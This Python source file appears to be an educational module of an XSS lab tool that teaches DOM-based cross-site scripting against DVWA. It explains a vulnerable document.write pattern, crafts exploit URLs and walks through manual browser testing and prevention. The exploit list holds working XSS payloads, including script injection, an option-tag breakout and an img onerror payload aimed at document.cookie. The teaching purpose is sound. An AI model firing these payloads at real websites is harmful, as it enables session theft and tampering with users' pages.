"""
DOM-based XSS module for XSS Lab Tool.
Demonstrates DOM XSS concepts through explanation and crafted URLs.
Note: True DOM XSS execution requires a browser; this module is educational.
"""

from ..explanations.text_blocks import XSSExplanations


class DOMXSSModule:
    """Interactive module for teaching DOM-based XSS (demonstration mode)."""

    def __init__(self, http_client, logger, target_config):
        """
        Initialize DOM XSS module.

        Args:
            http_client: HTTPClient instance
            logger: DualLogger instance
            target_config: TargetConfig instance
        """
        self.http = http_client
        self.logger = logger
        self.config = target_config
        self.explanations = XSSExplanations()

        # DVWA DOM XSS page path
        self.xss_dom_path = "vulnerabilities/xss_d/"

    def run_interactive(self, interactive: bool = True) -> bool:
        """
        Run the DOM XSS module in demonstration mode.

        Args:
            interactive: If True, pause for user confirmation at key steps

        Returns:
            True if demonstration completed successfully
        """
        self.logger.educational("", "DOM-BASED XSS MODULE (Demonstration)")
        self.logger.educational(self.explanations.DOM_XSS_INTRO)

        # Step 1: Explain the unique nature of DOM XSS
        self.logger.step(
            1,
            "Understanding DOM XSS",
            "DOM-based XSS is fundamentally different from Reflected and Stored XSS.\n"
            "The malicious payload NEVER goes to the server - it's processed entirely\n"
            "in the client-side JavaScript."
        )

        self.logger.educational(self.explanations.DOM_XSS_SOURCES_SINKS)

        if interactive and not self._get_user_approval("\nContinue with DOM XSS demonstration?"):
            self.logger.educational("Module stopped by user.")
            return False

        # Step 2: Fetch and analyze the vulnerable page
        self.logger.step(
            2,
            "Analyzing DVWA's DOM XSS Page",
            "Let's fetch the page and examine the vulnerable JavaScript code."
        )

        url = self.config.get_dvwa_url(self.xss_dom_path)
        response = self.http.get(url)

        if not response:
            self.logger.explain_failure(
                "Failed to fetch DOM XSS page",
                "Cannot reach the target page",
                "Verify DVWA is running and accessible"
            )
            return False

        self.logger.educational("✓ Successfully fetched DOM XSS page")

        # Step 3: Show the vulnerable code pattern
        self._explain_vulnerable_code()

        if interactive and not self._get_user_approval("\nProceed to craft exploit URLs?"):
            self.logger.educational("Module stopped by user.")
            return False

        # Step 4: Craft and explain exploit URLs
        self._demonstrate_exploit_urls()

        # Step 5: Explain how to test (manual)
        self._explain_manual_testing()

        # Step 6: Prevention
        self.logger.educational("\n" + "="*70)
        self.logger.educational(self.explanations.DOM_XSS_PREVENTION)

        return True

    def _explain_vulnerable_code(self):
        """Explain the typical vulnerable code pattern in DVWA DOM XSS."""
        self.logger.step(
            3,
            "Identifying Vulnerable Code Pattern",
            "DVWA's DOM XSS page typically contains JavaScript similar to this:"
        )

        vulnerable_code = """
// Vulnerable code example (typical DVWA pattern):
if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(
        document.location.href.indexOf("default=") + 8
    );
    document.write("<option value='" + lang + "'>" + lang + "</option>");
}
"""

        self.logger.educational(f"\n{vulnerable_code}")

        self.logger.educational(
            "What makes this vulnerable?\n\n"
            "1. SOURCE (attacker-controlled):\n"
            "   - document.location.href contains the full URL\n"
            "   - URL can be controlled by attacker\n"
            "   - Extracts value after 'default=' parameter\n\n"
            "2. SINK (dangerous operation):\n"
            "   - document.write() directly writes to DOM\n"
            "   - No encoding or validation applied\n"
            "   - If 'lang' contains HTML/JS, it executes\n\n"
            "3. THE VULNERABILITY:\n"
            "   - Data flows from URL → JavaScript → DOM without sanitization\n"
            "   - Server never sees or processes this data\n"
            "   - Traditional WAF/server-side filters cannot protect against this"
        )

    def _demonstrate_exploit_urls(self):
        """Demonstrate crafted exploit URLs."""
        self.logger.step(
            4,
            "Crafting DOM XSS Exploit URLs",
            "Here are malicious URLs that would trigger DOM XSS:"
        )

        base_url = self.config.get_dvwa_url(self.xss_dom_path)

        exploits = [
            {
                "payload": "<script>alert('DOM XSS')</script>",
                "url": f"{base_url}?default=<script>alert('DOM XSS')</script>",
                "explanation": "Basic script injection via URL parameter"
            },
            {
                "payload": "English</option><script>alert(1)</script>",
                "url": f"{base_url}?default=English</option><script>alert(1)</script>",
                "explanation": "Breaking out of the <option> tag context"
            },
            {
                "payload": "English</option><option value='tlh' selected>Klingon (tlh)</option>",
                "url": f"{base_url}?default=English</option><option value='tlh' selected>Klingon (tlh)</option>",
                "explanation": "Injects a brand-new Klingon option into the dropdown to prove DOM control"
            },
            {
                "payload": "English</option><img src=x onerror=alert(document.cookie)>",
                "url": f"{base_url}?default=English</option><img src=x onerror=alert(document.cookie)>",
                "explanation": "Using img onerror to steal cookies"
            }
        ]

        for i, exploit in enumerate(exploits, 1):
            self.logger.educational(f"\n[Exploit {i}]")
            self.logger.educational(f"Payload: {exploit['payload']}")
            self.logger.educational(f"Explanation: {exploit['explanation']}")
            self.logger.educational(f"Full URL:\n{exploit['url']}")

            self.logger.operational(f"DOM XSS exploit URL {i}: {exploit['url']}", "INFO")

    def _explain_manual_testing(self):
        """Explain how to manually test these exploits."""
        self.logger.step(
            5,
            "Manual Testing Instructions",
            "To test DOM XSS, you need an actual browser (this tool doesn't automate browsers)."
        )

        self.logger.educational(
            "\nManual walk-through (no Selenium or headless browser required):\n\n"
            "1. Keep DVWA open in a normal browser tab and log in once.\n"
            "2. Copy one of the exploit URLs above (the Klingon dropdown payload is a great visual demo).\n"
            "3. Paste the URL into the address bar and press Enter while connected to Burp if you want an intercept.\n"
            "4. Interact with the page manually:\n"
            "   - Click the language dropdown and observe that “Klingon (tlh)” now appears even though the server never offered it.\n"
            "   - Selecting that option proves the DOM has been rewritten client-side.\n"
            "   - If you used an alert payload, acknowledge the alert box to continue.\n"
            "5. Open DevTools (F12) → Elements tab and highlight the <select> element. You will see the injected <option> even though View Source does not show it.\n"
            "6. Use the Console to run `document.location.href` or `document.querySelector('select').innerHTML` to inspect the live DOM and capture screenshots for evidence.\n"
            "7. Reset the page by removing everything after `default=` in the URL and pressing Enter. Repeat with another payload to compare behaviors.\n\n"
            "Key takeaways:\n"
            "- The network response is identical each time; only the browser DOM changes.\n"
            "- Manual interaction is enough to validate DOM XSS; automation is optional but not required.\n"
            "- Capturing screenshots of the injected Klingon option or alert pop-ups makes airtight evidence."
        )

    def _get_user_approval(self, prompt: str) -> bool:
        """
        Ask user for approval to proceed.

        Args:
            prompt: Prompt to display

        Returns:
            True if user approves, False otherwise
        """
        try:
            response = input(f"\n{prompt} [y/N]: ").strip().lower()
            self.logger.operational(f"User response to '{prompt}': {response}", "INFO")
            return response in ['y', 'yes']
        except (KeyboardInterrupt, EOFError):
            self.logger.operational("User interrupted", "INFO")
            return False

    def get_target_url(self) -> str:
        """Get the full URL for the DOM XSS page."""
        return self.config.get_dvwa_url(self.xss_dom_path)
